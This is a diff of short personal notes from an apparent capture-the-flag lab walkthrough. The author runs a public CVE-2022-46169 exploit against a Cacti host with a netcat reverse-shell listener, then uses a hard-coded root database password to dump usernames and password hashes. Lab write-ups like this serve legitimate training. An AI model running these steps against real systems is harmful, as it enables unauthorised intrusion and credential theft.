@@ -8,4 +8,10 @@ I downloaded it to my pc with 'wget https://raw.githubusercontent.com/FredBrave/
 Started a nc listener with 'nc -lvnp 4444' and ran the script with 'python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.16.34 --LPORT=4444'.
 It worked and im in as 'www-data'!
 
-There is a lot of files but one is 'entry.sh' that seems interesting. 
+There is a lot of files but one is 'entrypoint.sh' in / that seems interesting. 
+Line 'mysql --host=db --user=root --password=root cacti -e "show tables"' gives all tables from the cacti and there is 'user_auth' among many files. 
+'mysql --host=db --user=root --password=root cacti -e "select * from user_auth"' show all the contents of user_auth table.
+'mysql --host=db --user=root --password=root cacti -e "select username,password from user_auth"' for things that intrest us.
+We get usernames and password hashes that can be probably cracked.
+I also uploaded 'lse.sh' to help with enumeration. It seems that we are in docker container.
+
